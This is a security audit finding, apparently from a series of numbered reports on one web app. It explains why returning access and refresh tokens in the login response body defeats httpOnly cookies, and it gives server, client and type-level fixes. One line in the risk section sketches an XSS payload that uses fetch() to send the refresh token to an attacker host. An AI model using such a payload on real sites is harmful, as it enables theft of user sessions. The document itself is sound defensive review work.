# 16. Access and refresh tokens returned in the JSON response body

- **Rank: 5 / 10**
- **Side: Both**
- **Category:** Token handling / defeats httpOnly
- **Location:** `server/src/controllers/userControllers/loginUser.ts:56-71`, `client/src/pages/Logout.tsx:23`, `client/src/hooks/data-fetching/useLogout.ts:14`

## The issue

`loginUser` sets the tokens as httpOnly cookies *and* returns them in the response body:

```ts
return res
  .status(200)
  .cookie("accessToken", newAccessToken, accessTokenCookieOptions)
  .cookie("refreshToken", newRefreshToken, refreshTokenCookieOptions)
  .json(new ApiResponse(200, {
    user: loggedInUser,
    accessToken: newAccessToken,      // <-- also in the body
    refreshToken: newRefreshToken,    // <-- also in the body
    loggedIn: true,
  }, "USER LOGGED IN SUCCESSFULLY"));
```

The cookies are correctly configured: `httpOnly: true`, `secure` in production, `sameSite` set (`server/src/constants.ts:7-22`). `httpOnly` exists to make the token unreadable from JavaScript, so that a cross-site scripting bug cannot steal the session.

Returning the same tokens in the JSON body hands them straight back to JavaScript, which is the exact thing `httpOnly` was set to prevent.

The client then stores them:

```ts
// client/src/contexts/AuthContextProvider.tsx:14
queryClient.setQueryData(["currentUser"], userData);
```

`userData` is the whole `{user, accessToken, refreshToken, loggedIn}` object, so both tokens sit in the React Query cache in memory. `Logout.tsx:23` reads one back out:

```ts
logoutMutate.mutate(user?.accessToken || "", { ... });
```

and `useLogout.ts:14` sends it as a bearer header.

## Why it matters

The severity is moderated by what the client *does not* do: nothing writes these to `localStorage` or `sessionStorage`. I checked, and the only `localStorage` use in the codebase is `ModeContextProvider.tsx` storing the dark-mode preference. So the tokens live in memory for the tab's lifetime and are gone on reload. That is meaningfully better than the common `localStorage.setItem("token", ...)` mistake.

What remains:

1. **XSS becomes token theft rather than session riding.** With cookie-only tokens, an XSS payload can make requests as the victim but only while the page is open, and it cannot exfiltrate anything reusable. With the token in the JS heap, the payload does `fetch(attacker, {body: queryClient.getQueryData(["currentUser"]).refreshToken})` and the attacker holds a **7-day** credential usable from anywhere. That is the difference between a contained incident and a persistent compromise.

2. **The refresh token is the worse of the two.** A 15-minute access token has limited value; a 7-day refresh token that rotates on every use is effectively indefinite access (see `10.password-change-does-not-revoke-sessions.md` for why changing the password does not stop it).

3. **It leaks into places tokens should not go.** Response bodies land in browser devtools network logs, HAR files attached to bug reports, error-tracking payloads, and any client-side logging. A token in a cookie header is at least conventionally treated as sensitive; a token in a JSON body is not.

4. **React Query devtools.** If you add `@tanstack/react-query-devtools` (common, and likely at some point), the cache is rendered in a panel, tokens included.

## Related inconsistency

The three auth endpoints return three different shapes:

| Endpoint | Returns | Sets cookies? |
| --- | --- | --- |
| `POST /users/login` | `{user, accessToken, refreshToken, loggedIn}` | yes |
| `POST /users/refresh-token` | `{user}` | yes |
| `POST /users/register` | the created user document | **no** |

`AuthContextProvider` feeds all three into the same `["currentUser"]` cache key. So `user.accessToken` exists right after login and is `undefined` after any page reload (which goes through `useRefreshUser`). `Logout.tsx` reads it, gets `undefined`, and sends `Authorization: Bearer `, which happens to work only because `verifyJWT` checks the cookie first (`auth.middleware.ts:22-24`).

This is fragile in a way that is easy to miss, and it is the kind of thing that produces bugs like the one in your most recent commit ("fix: logout screen for playlist").

## The fix

### Server: stop returning tokens

```ts
// server/src/controllers/userControllers/loginUser.ts
return res
  .status(200)
  .cookie("accessToken", newAccessToken, accessTokenCookieOptions)
  .cookie("refreshToken", newRefreshToken, refreshTokenCookieOptions)
  .json(new ApiResponse(200, { user: loggedInUser }, "USER LOGGED IN SUCCESSFULLY"));
```

That is the whole server-side change. Also drop `loggedIn: true`. The presence of a user object carries that information, and a redundant flag is one more thing to keep consistent.

While in this file, note that `refreshAccessToken.ts:33` selects `-password` only, so the `user` it returns still contains `refreshToken`. Covered in `08.user-object-overexposure.md`.

### Client: remove the token from the logout path

```ts
// client/src/hooks/data-fetching/useLogout.ts
const useLogout = () =>
  useMutation({
    mutationFn: async () => {
      const response = await fetch(`${URL}/users/logout`, {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/json" },
      });
      if (!response.ok) throw new Error("USER LOG OUT FAILED");
      return response.json();
    },
  });
```

```ts
// client/src/pages/Logout.tsx
const handleSubmit = (event: React.FormEvent<HTMLFormElement>) => {
  event.preventDefault();
  logoutMutate.mutate(undefined, {
    onSuccess: () => { logout(); toggleOpen(); },
  });
};
```

The mutation no longer takes an argument, so `user?.accessToken` is gone and `useAuth()`'s `user` is only needed for `logout()`.

`credentials: "include"` already sends the cookie, and `verifyJWT` already prefers the cookie. The bearer header was never doing anything.

### Type-level enforcement

Remove `accessToken` and `refreshToken` from the client's response types so the compiler catches any remaining reader:

```ts
// client/src/constants/responseTypes.ts
export type UserLoginAuthDataType = {
  user: PublicUser;
  // accessToken and refreshToken deliberately absent — cookie-only
};
```

Build the client. Every error is a place that was reading a token.

### Keep the bearer fallback on the server?

`verifyJWT` accepts `Authorization: Bearer <token>` as a fallback (`auth.middleware.ts:22-24`). Two views:

- **Keep it.** It makes the API testable from Postman/curl without cookie juggling, and the code comment says that was the intent. It costs nothing security-wise: an attacker who can set an `Authorization` header already has the token.
- **Remove it.** One fewer authentication path, and it removes the temptation to reintroduce body-returned tokens "for the API client".

I would keep it, but stop *issuing* tokens through any channel other than cookies. The two decisions are independent: accepting a bearer token does not require handing one out in a response body.

## Interaction with other documents

- `suggestions/04.unify-auth-session-model.md` is where this belongs architecturally. It defines one session shape (`{ user }`) returned by login, refresh, and a new `GET /users/me`, which resolves the three-shapes inconsistency described above. **Implement that document; this one is a subset of it.**
- `03.no-csrf-protection-with-cross-site-cookies.md`. Going cookie-only *increases* CSRF exposure, because the cookie is now the sole credential and it is sent automatically. These two must ship together. Cookie-only without CSRF tokens is a net regression.
- `10.password-change-does-not-revoke-sessions.md` reduces the value of a stolen refresh token by making it revocable. Complementary.
- `08.user-object-overexposure.md` covers the `refreshToken` hash still present in the refresh endpoint's user object.
- `suggestions/06.single-http-client-with-interceptors.md`. Once tokens are cookie-only, the client never touches a token at all, which simplifies the shared HTTP client to `withCredentials: true` and nothing else.
